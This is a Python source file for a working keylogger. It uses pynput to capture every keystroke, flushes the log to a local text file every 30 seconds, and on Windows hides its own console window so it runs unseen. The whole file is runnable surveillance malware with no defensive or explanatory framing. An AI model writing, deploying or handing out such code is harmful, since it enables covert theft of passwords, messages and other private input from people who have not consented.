import pynput.keyboard
import threading
import time
import os

class Keylogger:
    def __init__(self, time_interval=60, log_file="keylog.txt"):
        self.log = ""
        self.interval = time_interval
        self.log_file = log_file
        self.is_running = True
        
    def append_to_log(self, string):
        self.log += string
    
    def process_key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            elif key == key.enter:
                current_key = " [ENTER] "
            elif key == key.backspace:
                current_key = " [BACKSPACE] "
            elif key == key.tab:
                current_key = " [TAB] "
            else:
                current_key = f" [{key}] "
        self.append_to_log(current_key)
    
    def save_to_file(self):
        if self.log:
            with open(self.log_file, "a", encoding="utf-8") as f:
                f.write(self.log)
            self.log = ""
    
    def report(self):
        if self.is_running:
            self.save_to_file()
            timer = threading.Timer(self.interval, self.report)
            timer.daemon = True
            timer.start()
    
    def start(self):
        # Skrytí okna (platí pro Windows)
        try:
            import win32console
            import win32gui
            window = win32console.GetConsoleWindow()
            win32gui.ShowWindow(window, 0)
        except:
            pass
        
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()

    def stop(self):
        self.is_running = False
        self.save_to_file()

if __name__ == "__main__":
    keylogger = Keylogger(time_interval=30, log_file="testovany_soubor.txt")
    try:
        keylogger.start()
    except KeyboardInterrupt:
        keylogger.stop()
